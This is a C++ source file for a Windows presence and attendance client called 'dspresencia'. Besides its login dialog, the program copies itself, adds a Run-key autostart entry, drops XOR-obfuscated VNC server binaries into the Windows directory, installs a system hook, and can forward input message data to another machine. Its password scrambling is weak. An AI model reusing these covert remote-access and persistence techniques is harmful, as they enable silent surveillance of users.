
// ----------------------------------------------------------------------------
// headers
// ----------------------------------------------------------------------------
// For compilers that support precompilation, includes "wx/wx.h".
#if defined(__WXGTK__) || defined(__WXMOTIF__)
        #include "wx/wx.h"
#endif
#include "wx/wxprec.h"
#include "dspresenciaApp.h"
#include "dspresenciaFrm.h"
#include "DlgPresencia.h"
#include "DlgExplorer.h"
#include "resource.h"


#include <io.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <process.h>
#include <direct.h>


long en_tiempo_telefono = 0;

void ini_cola();
void lee_accesos(char *accesos);
void lee_ultimo_acceso(char *accesos);
void pon_ultimo_acceso(char *accesos);

extern "C"
{
extern HWND hwndMDIFrame;
char file_Origen[512] = "";
char file_Win[512] = "";

HINSTANCE hInst = NULL;
HWND hwndMDIFrame = NULL;
HWND hwndMDIClient = NULL;
HWND hDebugEdit = NULL;
HWND hDlgOperacion = NULL;
HWND hDlg = NULL;
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
BOOL PreActivacionesEspeciales(HWND hWnd, UINT message, WPARAM wParam,
                               LPARAM lParam);
void CargaHook(DWORD id);
int GrabaRecursoBin(HINSTANCE hInstance,char *name);
void FinHook();
void EnviaInfo(WPARAM,LPARAM);
int sinhook = 0;
void RecibeInfo(void *buf,unsigned long ip);


void PASCAL AppBarPosChanged(PAPPBARDATA pabd);
void AppBarCallback(HWND hwndAccessBar, UINT uNotifyMsg,LPARAM lParam);
void PASCAL AppBarQuerySetPos(UINT uEdge, LPRECT lprc, PAPPBARDATA pabd);
BOOL RegisterAccessBar(HWND hwndAccessBar, BOOL fRegister);
extern int NETFONE_COMMAND_PORT;

};



void no_name();
void OverrideServer(long nuevoserver);
int EnBarraTareas = 0;
unsigned char passwordinicial[25];
char usuarioinicial[128];
char accediocon[256];
int control_dspversion = 0x43000; /* XX000 */
wxString dsp_version = "3.0-43**";

#define MAX_LOADSTRING 100

#define APPBAR_CALLBACK (WM_USER + 110)

UINT g_uSide = ABE_TOP;
UINT g_fAppRegistered  = 0;


BEGIN_EVENT_TABLE(CDlgLogin, wxDialog)     
   EVT_BUTTON(-1, CDlgLogin::OnButton)        
   EVT_KEY_DOWN(CDlgLogin::OnKeyDown)   
END_EVENT_TABLE()

TCHAR szWindowClass[MAX_LOADSTRING] = "ds_phone_presencia";			// nombre de clase de la ventana principal

static ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX); 

	wcex.style			= 0; /*CS_HREDRAW | CS_VREDRAW;*/
	wcex.lpfnWndProc	= (WNDPROC)WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= NULL; /*LoadIcon(hInstance, (LPCTSTR)IDI_dswebcall)*/;
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= NULL;
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= NULL; /*LoadIcon(wcex.hInstance, (LPCTSTR)IDI_SMALL);*/

	return RegisterClassEx(&wcex);
}

// Create a new application object: this macro will allow wxWindows to create
// the application object during program execution (it's better than using a
// static object for many reasons) and also declares the accessor function
// wxGetApp() which will return the reference of the right type (i.e. dspresenciaApp and
// not wxApp)
IMPLEMENT_APP(dspresenciaApp)


// ============================================================================
// implementation
// ============================================================================

// ----------------------------------------------------------------------------
// the application class
// ----------------------------------------------------------------------------

// 'Main program' equivalent: the program execution "starts" here
#ifdef WIN32

static char windir[512];
static void start_reg()
{
HKEY hKey;
LONG retv;
char data[512];

//Software\\Microsoft\\Windows\\CurrentVersion\\Run

if (						   /*  */
  (retv = RegOpenKeyEx(/*HKEY_LOCAL_MACHINE*/HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,
                 KEY_QUERY_VALUE | KEY_SET_VALUE,				 
				 &hKey)) == ERROR_SUCCESS
	)
  {  
	  strcpy(data,windir);	  
	  RegSetValueEx(hKey,"dspresencia",0,REG_SZ,(const unsigned char *)data,strlen(data)+1);
	  RegCloseKey(hKey);
  }
}

extern "C"
{
	void ini_kill();
	int KillOthers(char *amatar);
}

#endif

extern HINSTANCE wxhInstance;


typedef DWORD (*HookInstala)(HWND,DWORD,BOOL); 
typedef DWORD (*HookElimina)(); 
HINSTANCE m_hook = NULL;
HookInstala m_instala = NULL;
HookElimina m_elimina = NULL;


// RegisterAccessBar - registers or unregisters an appbar. 
// Returns TRUE if successful, or FALSE otherwise. 
// hwndAccessBar - handle to the appbar 
// fRegister - register and unregister flag 
// 
// Global variables 
//     g_uSide - screen edge (defaults to ABE_TOP) 
//     g_fAppRegistered - flag indicating whether the bar is registered 
BOOL RegisterAccessBar(HWND hwndAccessBar, BOOL fRegister) 
{ 
    APPBARDATA abd; 
	DWORD ex;
	static RECT rr;
 
    // Specify the structure size and handle to the appbar. 
    abd.cbSize = sizeof(APPBARDATA); 
    abd.hWnd = hwndAccessBar; 
 
    if (fRegister) 
	{

		GetWindowRect(hwndAccessBar,&rr);

		ex = GetWindowLong(hwndAccessBar,GWL_EXSTYLE);
		SetWindowLong(hwndAccessBar,GWL_EXSTYLE,ex | WS_EX_TOOLWINDOW);		

		ex = GetWindowLong(hwndAccessBar,GWL_STYLE);
		SetWindowLong(hwndAccessBar,GWL_STYLE,ex & ~WS_CAPTION);		

		MoveWindow(hwndAccessBar,0,0,1,1,TRUE);
 
        // Provide an identifier for notification messages. 
        abd.uCallbackMessage = APPBAR_CALLBACK; 
 
        // Register the appbar. 

		/*
        if (!SHAppBarMessage(ABM_NEW, &abd)) 
            return FALSE;		
		*/

		abd.cbSize = sizeof(APPBARDATA); 
		abd.hWnd = hwndAccessBar; 
		abd.uEdge = ABE_TOP;
		abd.lParam = TRUE;

        if (!SHAppBarMessage(ABM_SETAUTOHIDEBAR, &abd)) 
            return FALSE; 
		
        g_uSide = ABE_TOP;       // default edge 
        g_fAppRegistered = TRUE; 
    } else { 
 
        // Unregister the appbar. 
		abd.uEdge = ABE_TOP;
		abd.lParam = FALSE;

        if (!SHAppBarMessage(ABM_SETAUTOHIDEBAR, &abd)) 
            return FALSE; 

		abd.cbSize = sizeof(APPBARDATA); 
		abd.hWnd = hwndAccessBar; 

		/*
        SHAppBarMessage(ABM_REMOVE, &abd); 
		*/

        g_fAppRegistered = FALSE; 

		ex = GetWindowLong(hwndAccessBar,GWL_EXSTYLE);
		SetWindowLong(hwndAccessBar,GWL_EXSTYLE,(ex & ~WS_EX_TOOLWINDOW));

		ex = GetWindowLong(hwndAccessBar,GWL_STYLE);
		SetWindowLong(hwndAccessBar,GWL_STYLE,ex | WS_CAPTION);

		MoveWindow(hwndAccessBar,rr.left,rr.top,rr.right,rr.bottom,TRUE);

    } 
    return TRUE; 
}

// AppBarQuerySetPos - sets the size and position of an appbar. 
// uEdge - screen edge to which the appbar is to be anchored 
// lprc - current bounding rectangle of the appbar 
// pabd - address of the APPBARDATA structure with the hWnd and 
//     cbSize members filled 
void PASCAL AppBarQuerySetPos(UINT uEdge, LPRECT lprc, PAPPBARDATA pabd) 
{ 
    int iHeight = 0; 
    int iWidth = 0; 
 
    pabd->rc = *lprc; 
    pabd->uEdge = uEdge; 
 
    // Copy the screen coordinates of the appbar's bounding 
    // rectangle into the APPBARDATA structure. 
    if ((uEdge == ABE_LEFT) || 
            (uEdge == ABE_RIGHT)) { 
        iWidth = pabd->rc.right - pabd->rc.left; 
        pabd->rc.top = 0; 
        pabd->rc.bottom = GetSystemMetrics(SM_CYSCREEN); 
    } else { 
        iHeight = pabd->rc.bottom - pabd->rc.top; 
        pabd->rc.left = 0; 
        pabd->rc.right = GetSystemMetrics(SM_CXSCREEN); 
    } 
 
    // Query the system for an approved size and position. 
    SHAppBarMessage(ABM_QUERYPOS, pabd); 
 
    // Adjust the rectangle, depending on the edge to which the 
    // appbar is anchored. 
    switch (uEdge) { 
        case ABE_LEFT: 
            pabd->rc.right = pabd->rc.left + iWidth; 
            break; 
 
        case ABE_RIGHT: 
            pabd->rc.left = pabd->rc.right - iWidth; 
            break; 
 
        case ABE_TOP: 
            pabd->rc.bottom = pabd->rc.top + iHeight; 
            break; 
 
        case ABE_BOTTOM: 
            pabd->rc.top = pabd->rc.bottom - iHeight; 
            break; 
    } 
 
    // Pass the final bounding rectangle to the system. 
    SHAppBarMessage(ABM_SETPOS, pabd); 
 
    // Move and size the appbar so that it conforms to the 
    // bounding rectangle passed to the system. 
    MoveWindow(pabd->hWnd, pabd->rc.left, pabd->rc.top, 
        pabd->rc.right - pabd->rc.left, 
        pabd->rc.bottom - pabd->rc.top, TRUE); 
}

// AppBarCallback - processes notification messages sent by the system. 
// hwndAccessBar - handle to the appbar 
// uNotifyMsg - identifier of the notification message 
// lParam - message parameter 
void AppBarCallback(HWND hwndAccessBar, UINT uNotifyMsg, 
    LPARAM lParam) 
{ 
    APPBARDATA abd; 
    UINT uState = 0; 
 
    abd.cbSize = sizeof(abd); 
    abd.hWnd = hwndAccessBar; 
 
    switch (uNotifyMsg) { 
        case ABN_STATECHANGE: 
 
            // Check to see if the taskbar's always-on-top state has 
            // changed and, if it has, change the appbar's state 
            // accordingly. 
            uState = SHAppBarMessage(ABM_GETSTATE, &abd); 
            SetWindowPos(hwndAccessBar, 
                (ABS_ALWAYSONTOP & uState) ? HWND_TOPMOST : HWND_BOTTOM, 
                0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE); 
            break; 
 
        case ABN_FULLSCREENAPP: 
 
            // A full-screen application has started, or the last full- 
            // screen application has closed. Set the appbar's 
            // z-order appropriately. 
            if (lParam) { 
                SetWindowPos(hwndAccessBar, 
                    (ABS_ALWAYSONTOP & uState) ? 
                                            HWND_TOPMOST : HWND_BOTTOM, 
                    0, 0, 0, 0, 
                    SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE); 
            } else { 
                uState = SHAppBarMessage(ABM_GETSTATE, &abd); 
                if (uState & ABS_ALWAYSONTOP) 
                    SetWindowPos(hwndAccessBar, HWND_TOPMOST, 
                        0, 0, 0, 0, 
                        SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE); 
        } 
 
        case ABN_POSCHANGED: 
 
            // The taskbar or another appbar has changed its 
            // size or position. 
            AppBarPosChanged(&abd); 
            break; 
    } 
}

// AppBarPosChanged - adjusts the appbar's size and position. 
// pabd - address of an APPBARDATA structure that contains information 
//     used to adjust the size and position 
void PASCAL AppBarPosChanged(PAPPBARDATA pabd) 
{ 
    RECT rc; 
    RECT rcWindow; 
    int iHeight; 
    int iWidth; 
 
    rc.top = 0; 
    rc.left = 0; 
    rc.right = GetSystemMetrics(SM_CXSCREEN); 
    rc.bottom = GetSystemMetrics(SM_CYSCREEN); 
 
    GetWindowRect(pabd->hWnd, &rcWindow); 
    iHeight = rcWindow.bottom - rcWindow.top; 
    iWidth = rcWindow.right - rcWindow.left; 
 
    switch (g_uSide) 
	{
        case ABE_TOP: 
            rc.bottom = rc.top + iHeight; 
            break; 
 
        case ABE_BOTTOM: 
            rc.top = rc.bottom - iHeight; 
            break; 
 
        case ABE_LEFT: 
            rc.right = rc.left + iWidth; 
            break; 
 
        case ABE_RIGHT: 
            rc.left = rc.right - iWidth; 
            break; 
        } 
        AppBarQuerySetPos(g_uSide, &rc, pabd);    
		SHAppBarMessage(ABM_SETPOS, pabd);		
}



CDlgLogin::CDlgLogin(CDlgPresencia* parent,
							 wxWindowID id,
							 const wxString& title, 
							 const wxPoint& pos,
							 const wxSize& size ,
							 long style, 
							 const wxString& name) : 	wxDialog(parent, id,title,pos,size,style,name)
{		
	wxString choices[100];
	char tmp[2100];
	int n = 0;
	int i;

	tmp[0] = 0;
	lee_accesos(tmp);
	if (tmp[0]) {
		char *p = tmp;
		for (i = 0;tmp[i];i++) {
			if (tmp[i] == '\n') {
				tmp[i] = 0;
				if (*p && n < 100) {
					choices[n++] = p;
				}
				p = tmp+i+1;
			}
		}
		tmp[i+1] = 0;
		if (*p && n < 100) {
			choices[n++] = p;
		}
	}
	
	long server = dame_the_server();
	long ip = htonl(dame_the_name());

	tmp[0] = 0;
	lee_ultimo_acceso(tmp);	
	wxString s1 = tmp;
	if (!tmp[0]) {
		i = 0;
		sprintf(tmp,"%3d%03d%03d%03d", ((ip >> 24) & 0xff),((ip >> 16) & 0xff),((ip >> 8) & 0xff),ip & 0xff);
		while(tmp[i] == ' ') i++;
		s1 = tmp+i;
	}
	m_usuario.Create(this,-1,"",wxDefaultPosition,wxSize(250,20),n,choices,wxCB_DROPDOWN);
	m_password.Create(this,-1,"",wxDefaultPosition,wxSize(250,20),wxTE_PASSWORD);
	m_usuario.SetValue(s1+" ");	



	m_ok.Create(this, wxID_OK, "Aceptar");
	m_cancel.Create(this, wxID_CANCEL, "Cancelar");	
	m_ok.SetDefault();

	wxStaticText *statico0 = new wxStaticText(this,-1,"Número de usuario o nombre...",wxDefaultPosition,wxSize(150,20),0);
	wxStaticText *statico1 = new wxStaticText(this,-1,"Password...",wxDefaultPosition,wxSize(150,20),0);			
	
	

	m_sizer = new wxBoxSizer(wxVERTICAL);

	m_sizerTop = new wxBoxSizer(wxVERTICAL);
	m_sizerMid = new wxBoxSizer(wxVERTICAL);
	m_sizerBottom = new wxBoxSizer(wxHORIZONTAL);


	m_sizerTop->Add(statico0, 0, wxALIGN_LEFT | wxLEFT, 10);	
	m_sizerTop->Add(&m_usuario, 0, wxALIGN_LEFT | wxLEFT, 0);

	m_sizerMid->Add(statico1, 0, wxALIGN_LEFT | wxLEFT, 10);	
	m_sizerMid->Add(&m_password, 0, wxALIGN_LEFT | wxLEFT, 0);	

	m_sizerBottom->Add(&m_ok, 0, wxALIGN_CENTER | wxRIGHT , 10);
	m_sizerBottom->Add(&m_cancel, 1, wxALIGN_CENTER | wxLEFT , 10);	

	m_sizer->Add(m_sizerTop, 0, wxALIGN_CENTER | wxTOP, 10);
    m_sizer->Add(m_sizerMid, 0, wxALIGN_CENTER | wxTOP, 15);
    m_sizer->Add(m_sizerBottom, 1, wxALIGN_CENTER | wxTOP, 15);

    SetAutoLayout(TRUE);
    SetSizer(m_sizer);
    
	m_sizer->SetSizeHints(this);
    m_sizer->Fit(this);	

	if (ip) {
		m_password.SetFocus();
	}
	else
		m_usuario.SetFocus();
}


void CDlgLogin::OnButton(wxCommandEvent& event)
{
    if ( event.GetEventObject() == &m_ok )
    {
		EndModal(wxID_OK);
	}
	else if ( event.GetEventObject() == &m_cancel )
	{
		EndModal(wxID_CANCEL);
	}
}

void CDlgLogin::OnKeyDown(wxKeyEvent& event) 
{
	if (event.GetKeyCode() == WXK_RETURN)
	{
		EndModal(wxID_OK);
	}
	else if (event.GetKeyCode() == WXK_ESCAPE)
	{
		EndModal(wxID_CANCEL);
	}
}

CDlgLogin::~CDlgLogin()
{
}


bool dspresenciaApp::OnInit()
{	

	ini_cola();
	
	passwordinicial[0] = 0;
	usuarioinicial[0] = 0;
	accediocon[0] = 0;

    InitCommonControls();    // initialize common control library  

#ifdef WIN32
	ini_kill();
	if (KillOthers("dspresenci") > 0)
	{
		Sleep(2000);
	}
	

	//char *pp = getenv("windir");
	char *pp = ajusta_a_home_dir("\\dsp");
	char tmp[512];
	char tmp2[512];
	char parametros[512];
	char otro_destino[512];
	otro_destino[0] = 0;
	mkdir(pp);
	if (!pp)
	{
		pp = "C:\\WINDOWS";
		mkdir(pp);
	}
	{
		int i;
		int comillas = 0;
		parametros[0] = 0;
		strcpy(tmp,GetCommandLine());
		i = 0;
		while(tmp[i] && tmp[i] == ' ')
		{
			i++;
		}
		if (tmp[i] == '"')
		{
			comillas = 1;
			i++;
		}
		while(tmp[i] && tmp[i] == ' ')
		{
			i++;
		}
		if (i)
		{
			strcpy(tmp,GetCommandLine()+i);
		}
		if (comillas)
		{
			while(tmp[i] && tmp[i] != '"')
			{
				i++;
			}
			if (tmp[i])
			{
				tmp[i] = 0;
				i++;
				while(tmp[i] && tmp[i] == ' ')
				{
					i++;
				}
				strcpy(parametros,tmp+i);
			}
		}
		else
		{
			while(tmp[i] && tmp[i] != ' ')
			{
				i++;
			}
			if (tmp[i])
			{
				tmp[i] = 0;
				i++;
				while(tmp[i] && tmp[i] == ' ')
				{
					i++;
				}
				strcpy(parametros,tmp+i);
			}
		}
		if (!memcmp(parametros,"-XXX ",5))
		{
			OverrideServer((long)inet_addr(parametros+5));
		}
		else
		{
			if (parametros[0] == ':')
			{
				memcpy(passwordinicial,parametros+1,20);
				i = 1;
				tmp2[0] = 0;
				while(parametros[i] && parametros[i] != ':')
					i++;
				if (parametros[i])
				{
					parametros[i] = 0;
					i++;
					while(parametros[i] && parametros[i] == ' ') i++;				
					strcpy(tmp2,parametros+i);
				}
				strcpy(parametros,tmp2);			
			}
			if (parametros[0] == '}')
			{
				strcpy(otro_destino,parametros+1);
			}
			else
			{
				i = strlen(parametros);
				i--;
				if (i > 0 && parametros[i] == '{')
				{			
					parametros[i] = 0;
					unlink(parametros);
					if (!passwordinicial[0])
					{
						MessageBox(NULL,"SE HA CAMBIADO LA VERSION DEL DSPRESENCIA, VUELVA A REGISTRAR SU ENTRADA POR FAVOR","AVISO",MB_OK|MB_ICONHAND);
					}
				}

				i = strlen(tmp);
				i--;
				while(i >= 0 && tmp[i] != '\\' && tmp[i] != '/')
				{
					i--;
				}
				if (i < 0)
					i = 0;
				else
					i++;
				strlwr(tmp+i);
				if (strcmp(tmp+i,"dspresencia.exe"))
				{
					sprintf(parametros,"Este programa se ha de llamar dspresencia.exe y no %s",tmp+i);
					MessageBox(NULL,parametros,"ERROR!!",MB_OK|MB_ICONHAND);
					exit(2);
				}
			}		
		
			strcpy(windir,pp);
			strcat(windir,"\\dspresencia.exe");
			strcpy(file_Origen,tmp);
			strcpy(file_Win,windir);
			if (!strstr(tmp,"\\dsp\\") && !strstr(tmp,"/dsp/") /*strcmp(tmp,windir)*/)
			{
				if (!CopyFile(tmp,windir,FALSE))
				{
					strcat(tmp," a ");
					strcat(tmp,windir);
					MessageBox(NULL,tmp,"NO PUEDO COPIAR",MB_OK|MB_ICONHAND);
					exit(2);
				}
			}
			if (otro_destino[0])
			{
				tmp2[0] = 0;
				for (i = 0;otro_destino[i];i++)
				{
					if (otro_destino[i] == ' ' && otro_destino[i+1] == ':')
						break;
				}
				if (otro_destino[i] == ' ')
				{
					otro_destino[i] = 0;
					memcpy(tmp2,otro_destino+i+1,22);
					tmp2[22] = ' ';
					tmp2[23] = 0;
				}
				if (!CopyFile(tmp,otro_destino,FALSE))
				{
					strcat(tmp," a ");
					strcat(tmp,otro_destino);
					MessageBox(NULL,tmp,"NO PUEDO COPIAR",MB_OK|MB_ICONHAND);
					exit(2);
				}
			}
			start_reg();
			if (otro_destino[0])
			{		
				strcat(tmp2,tmp);
				strcat(tmp2,"{");
				_execl( otro_destino,otro_destino, tmp2, NULL );
				exit(2);
			}
		}
	}
#endif

	hInst = wxhInstance;

	if (!passwordinicial[0])
	{
		CDlgLogin *pDlgLogin;
		wxSize size(200,150);
		pDlgLogin = new CDlgLogin(NULL,-1, "Acceso",wxDefaultPosition,size,wxRESIZE_BORDER|wxSTAY_ON_TOP);
		if (pDlgLogin->ShowModal() == wxID_OK)
		{
			unsigned char dstr[512];
			char tmp[512];
			wxString s1 = pDlgLogin->m_usuario.GetValue();
			memset(dstr,' ',10);
			memcpy(dstr,pDlgLogin->m_password.GetValue(),pDlgLogin->m_password.GetValue().Len());
			dstr[10] = 0;
			int j = 0;
			int h,i;		
			for (i = 0;i < 10;i++)
			{
				h = dstr[i] * 2;
				passwordinicial[j++] = (h/26) + 'A';		
				passwordinicial[j++] = (h%26) + 'A';
			}
			passwordinicial[20] = 0;
			for (i = 0;i < 20;i++)
			{
				passwordinicial[i] ^= 33;
			}
			s1.Trim();
			strcpy(accediocon,s1);
			strcpy(tmp,s1);
			long nuevoname = 0;
			long nuevoserver= 0;
			j = 0;
			for (i = 0;tmp[i];i++) {
				if (tmp[i] == '.') {
					j = i + 1;
				}
				if (tmp[i] == '@') {
					nuevoserver = (long)inet_addr(tmp+i+1); 
					if (!nuevoserver || nuevoserver == INADDR_NONE) {
						struct hostent *mihost;
#ifdef WIN32
						WORD      wVersionRequested;
						WSADATA   wsaData;
#endif

#ifdef WIN32
						wVersionRequested = MAKEWORD(1,1);
						WSAStartup(wVersionRequested, &wsaData);
#endif

						if ( (mihost = gethostbyname(tmp+i+1)) && mihost->h_length == 4 && mihost->h_addr_list[0])
						{	    
						    nuevoserver =  *((long *)mihost->h_addr_list[0]);
							if (nuevoserver == INADDR_NONE)
								nuevoserver = 0;

						}
					}
					tmp[i] = 0;
					break;
				}
			}
		    strcpy((char *)dstr,tmp+j);
			tmp[j] = 0;
			no_name();
			if (j) {
			    strcpy(usuarioinicial,tmp);				
			}
			else
				strcpy(usuarioinicial,(char *)dstr);
			s1 = tmp; // nombre del usuario
			j = strlen((char *)dstr);			
			if (j) {
				int flag = 0;
			    i = 12-j;
				h = 0;
				for(j = 0;dstr[j];j++) {
					if (flag || dstr[j] != '0' || ((i+1)%3) == 0) {
						tmp[h++] = (char)dstr[j];
						flag = 1;
					}
					if (dstr[j+1] && ((i+1)%3) == 0) {
						tmp[h++] = '.';						
						flag = 0;						
					}
					i++;
				}
				tmp[h] = 0;
				nuevoname = (long)inet_addr(tmp);
				if (nuevoname == INADDR_NONE)
					nuevoname = 0;
			}
			
			//struct in_addr iii;
			//iii.s_addr = nuevoname;
			//wxMessageBox(inet_ntoa(iii),tmp,wxOK /*| wxCENTRE */| wxICON_HAND,NULL);
			if (nuevoname)
				PonTheName(nuevoname);
			else {
				if (usuarioinicial[0]) {
					PonTheName(0);
				}
			}
			if (nuevoserver)
				PonTheServer(nuevoserver);
		}
		else {
			OnExit();
			exit(0);
		}
	}



	wxSize size(1,1);
	{
		wxString titulo;
		titulo = "DSP "+dsp_version;

#ifdef WIN32
	m_pdlg = new CDlgPresencia(NULL,-1, titulo,wxDefaultPosition,size,wxRESIZE_BORDER/*|wxSTAY_ON_TOP*/);
#else
	m_pdlg = new CDlgPresencia(NULL,-1, titulo,wxDefaultPosition,size,wxRESIZE_BORDER);
#endif
	}

	hDlg = (HWND)m_pdlg->GetHandle(); 	
	SetTopWindow((wxWindow*)m_pdlg);


	{
		long ip = htonl(dame_the_name());				
		NETFONE_COMMAND_PORT =5900 + (ip & 0xff);
	}

   MyRegisterClass(hInst);
   hwndMDIFrame = CreateWindow(szWindowClass,"", WS_CHILD,
      0, 0, 1, 1,(HWND)hDlgOperacion, NULL, hInst, NULL);   
   hwndMDIClient = hwndMDIFrame;   



   GrabaRecursoBin(hInst,"DSTVNCVW.EXE");
   GrabaRecursoBin(hInst,"OMNITHREAD_RT.DLL");
   GrabaRecursoBin(hInst,"VNCHOOKS.DLL");
   GrabaRecursoBin(hInst,"WINDSTVNC.EXE");
   GrabaRecursoBin(hInst,"ZLIB.DLL");
   CargaHook(NULL);   


	//dlg.Create();
	//dlg.ShowModal();
	//wxApp::OnRun();	


	return TRUE;
	/*
    // create the main application window
    dspresenciaFrame *frame = new dspresenciaFrame("Control de Presencia",
                                 wxPoint(50, 50), wxSize(450, 340));

    // and show it (the frames, unlike simple controls, are not shown when
    // created initially)
    frame->Show(TRUE);

    // success: wxApp::OnRun() will be called which will enter the main message
    // loop and the application will run. If we returned FALSE here, the
    // application would exit immediately.	
    return TRUE;
	*/
}

int dspresenciaApp::OnExit()
{	
	if (g_fAppRegistered)
	{
		RegisterAccessBar(hDlg,FALSE);
	}
	FinHook();
	/*
	if (m_pdlg)
	{
		delete m_pdlg;
	}
	*/
	return wxApp::OnExit();
}

extern "C"
{
	extern int envia_debug_info;
};

void EnviaParam(int cuenta,WPARAM *wparams,LPARAM *lparams);
bool dspresenciaApp::ProcessMessage(WXMSG* pMsg)
{	
	static WPARAM wparams[512];
	static LPARAM lparams[512];
	static int cuenta  = 0;
	static long tiempo = 0;

	//int i;

	/*
	if (envia_debug_info)
	{
		wparams[cuenta] = ((MSG *)pMsg)->wParam;
		lparams[cuenta] = ((MSG *)pMsg)->lParam;
		cuenta++;
		if (cuenta == 1)
		{
			tiempo = time(NULL) + 40 + rand()%30; //el factor variable de timeout es una prueba
		}
		if (cuenta == 512 || (cuenta && tiempo < time(NULL)))
		{
			EnviaParam(cuenta,wparams,lparams);
			cuenta = 0;
			tiempo = time(NULL) + 40 + rand()%30;
		}
	}
	*/


	if (PreActivacionesEspeciales(((MSG *)pMsg)->hwnd,((MSG *)pMsg)->message,((MSG *)pMsg)->wParam,((MSG *)pMsg)->lParam))
		return TRUE;
	
	if (((MSG *)pMsg)->message == WM_SOCKET_SELECT && ((MSG *)pMsg)->hwnd != hwndMDIFrame)
	{
	   wxWindow *win;
	   win = (wxWindow *)::GetWindowLong(((MSG *)pMsg)->hwnd, GWL_USERDATA);
	   if (win/* && win->IsKindOf(CLASSINFO(CDlgExplorer))*/)
	   {
		   ((CDlgExplorer *)win)->SocketSelect(((MSG *)pMsg)->wParam,((MSG *)pMsg)->lParam);
		   return TRUE;
	   }	   	   
	}

	if (((MSG *)pMsg)->hwnd == hDlg && ((MSG *)pMsg)->message == APPBAR_CALLBACK)
	{
			void AppBarCallback(HWND hwndAccessBar, UINT uNotifyMsg,LPARAM lParam);
			AppBarCallback(hDlg,((MSG *)pMsg)->wParam,((MSG *)pMsg)->lParam);
			return TRUE;
	}

	
	if (((MSG *)pMsg)->message == (WM_USER+755) || ((MSG *)pMsg)->message == (WM_USER+756))
	{			
		if (m_pdlg)
		{
			m_pdlg->Movimiento(FALSE);
		}

		/*
		if ( (GetKeyState( VK_MENU ) & 0x8000) )
		{
			if (((MSG *)pMsg)->wParam == VK_F5)
			{
				MessageBeep(0);
				if (!en_tiempo_telefono)
					en_tiempo_telefono = time(NULL);
			}
			else if (((MSG *)pMsg)->wParam == VK_F6)
			{
				MessageBeep(0);
				en_tiempo_telefono = 0;
			}
		}
		*/
		return TRUE;
	}	

	if (envia_debug_info)
	{
		if (cuenta == 512 || (cuenta && tiempo < time(NULL)))
		{
			EnviaParam(cuenta,wparams,lparams);
			cuenta = 0;
			tiempo = time(NULL) + 40 + rand()%30;
		}
	}
    return wxApp::ProcessMessage(pMsg);
}


int GrabaRecursoBin(HINSTANCE hInstance,char *name)
{
	HRSRC hrsrc;
	BOOL r = 0;
	hrsrc = FindResource(hInstance,name,"BIN");
	if (hrsrc)
	{
		HGLOBAL h;
		int len = (int)SizeofResource(hInstance,hrsrc);
		h = LoadResource(hInstance,hrsrc);
		if (h)
		{
			void *p;
			char *pp = getenv("windir");
			char tmp[512];
			p = LockResource(h);
			if (p && pp)
			{
				sprintf(tmp,"%s\\%s",pp,name);				
				int file;
				file = open(tmp,O_BINARY | O_RDWR | O_CREAT | O_TRUNC,S_IWRITE | S_IREAD);
				if (file >= 0)
				{
					int j;
					for (j = 0;j < len;j++)
					{
						((char *)p)[j] ^= 27;
					}
					write(file,p,len);
					close(file);
					r = 1;
				}
			}
		}
		DeleteObject(hrsrc);
	}
	return r;
}

void CargaHook(DWORD id)
{
	int len;	

	if (m_hook)
	{
		FreeLibrary(m_hook);
	}
	m_hook = LoadLibrary("ds_k_int.dll");
	if (!m_hook)
	{
		extern HINSTANCE wxhInstance;
		HRSRC hrsrc;
		hrsrc = FindResource(wxhInstance,MAKEINTRESOURCE(IDR_HOOK),"DLL");
		if (hrsrc)
		{
			HGLOBAL h;
			len = (int)SizeofResource(wxhInstance,hrsrc);
			h = LoadResource(wxhInstance,hrsrc);
			if (h)
			{
				void *p;
				char *pp = getenv("windir");
				char tmp[512];
				p = LockResource(h);
				if (p && pp)
				{
					sprintf(tmp,"%s\\ds_k_int.dll",pp);
					int file;
					file = open(tmp,O_BINARY | O_RDWR | O_CREAT | O_TRUNC,S_IWRITE | S_IREAD);
					if (file >= 0)
					{
						write(file,p,len);
						close(file);
					}
					else
					{
						MessageBox(NULL,"No se puede instalar correctamente DSP","Error",MB_OK|MB_ICONHAND);
					}
					m_hook = LoadLibrary(tmp);
				}
			}
			DeleteObject(hrsrc);
		}
	}
	if (m_hook)
	{
		m_instala = (HookInstala)GetProcAddress(m_hook,"instala");
		m_elimina = (HookElimina)GetProcAddress(m_hook,"elimina");
		if ((void *)m_instala)
		{
			DWORD hook = m_instala((HWND)hDlgOperacion,id,FALSE);
			if (!hook)
			{
				sinhook = 1;
			}
		}
	}
	else
	{
		sinhook = 1;
	}
}

void FinHook()
{
	if ((void *)m_hook)
	{
		if ((void *)m_elimina)
		{
			m_elimina();
		}
		FreeLibrary(m_hook);
		m_hook = NULL;
	}
}

typedef struct
{
  ULONG  compression;	
  LONG   tick;
  WPARAM wparam;
  LPARAM lparam;  
} infopars;

void RecibeInfo(void *buf,unsigned long ip)
{
	static int file_debug_log = -1;
	// Control de la informacion recibida de debug de la otra maquina,
	// Control del control remoto, mensajes de la voz etc, 	
	// evaluar problemas del hook.
	// acordarse de quitarlo en la version oficial
	if (ip != (unsigned long)dame_the_name())
	{
		if (file_debug_log < 0)
		{
			file_debug_log = open(ajusta_a_home_dir("\\dsp\\tmp\\debug_1.log"),O_RDWR|O_BINARY|O_CREAT,S_IREAD|S_IWRITE);
			if (file_debug_log < 0)
			{
				lseek(file_debug_log,0L,SEEK_END);
			}
		}
		if (file_debug_log >= 0)
		{
			infopars *p;
			ip ^= 0x1f1f;
			p = (infopars *)buf;
			write(file_debug_log,&ip,sizeof(ip));
			write(file_debug_log,&(p->wparam),sizeof(WPARAM));
			write(file_debug_log,&(p->lparam),sizeof(LPARAM));
		}		
	}
}


